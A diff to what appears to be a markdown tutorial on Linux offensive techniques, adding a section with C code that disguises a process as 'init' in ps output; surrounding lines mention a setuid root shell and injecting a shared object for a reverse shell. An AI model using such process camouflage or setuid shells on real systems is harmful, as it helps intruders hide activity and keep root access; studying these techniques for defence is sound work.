@@ -79,6 +79,26 @@ int main(int argc, char **argv)
 setuid as root `chown root:root .setuid-shell` then `chmod u+s .setuid-shell`<br />
 Now execute `.setuid-shell` and see that you are root by issuing the `id` command.
 
+## >> Changing the process name in ps
+
+This example shows how to camouflage a process name shown by the `ps` command.<br />
+Create program source named `hidden.c`.<br />
+```c
+#include <string.h>
+#include <unistd.h>
+
+int main(int argc, char **argv)
+{
+   char *fakename = "init"; // ensure that the program name is long enough to hold fakename
+   memcpy(argv[0], fakename, strlen(fakename));
+   memset(argv[0] + strlen(fakename), 0, strlen(argv[0]) - strlen(fakename));
+   sleep(120);
+   return -1;
+}
+```
+Compile `gcc -o hidden hidden.c` and execute `./hidden`<br />
+The `ps` command should show the process name as `init`.
+
 ## >> Injecting a shared object into a running process to get a reverse shell
 
 This technique will dynamically load a library (.so file) into an existing process to get a reverse shell as the user the process is running as.<br />
